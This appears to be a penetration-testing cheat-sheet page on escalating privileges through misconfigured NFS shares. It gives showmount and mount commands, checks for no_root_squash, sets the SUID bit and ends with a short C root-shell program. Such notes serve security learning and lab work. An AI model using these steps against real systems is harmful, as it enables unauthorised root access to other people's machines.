<title>NFS Shares</title>
</head><body># First check if the target machine has any NFS shares<br/>
showmount -e 192.168.1.101<br/>
<br/>
# If it does, then mount it to you filesystem<br/>
mount 192.168.1.101:/ /tmp/<br/>
<br/>
If that succeeds then you can go to /tmp/share. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.<br/>
<br/>
If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.<br/>
<br/>
check /etc/exports. If the share specifically is served with the no_root_squash (or you can edit it to serve as such), you can perform the following SUID escalation. (I was unsuccessful performing it with just (rw) and nothing else, I needed to have (rw,no_root_squash)).<br/>
<br/>
This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:<br/>
<br/>
chmod 4777 exploit<br/>
<br/>
#include &lt;stdio.h&gt;<br/>
#include &lt;stdlib.h&gt;<br/>
#include &lt;sys/types.h&gt;<br/>
#include &lt;unistd.h&gt;<br/>
<br/>
int main()<br/>
{<br/>
  setuid(0);<br/>
  system(&quot;/bin/bash&quot;);<br/>
  return 0;<br/>
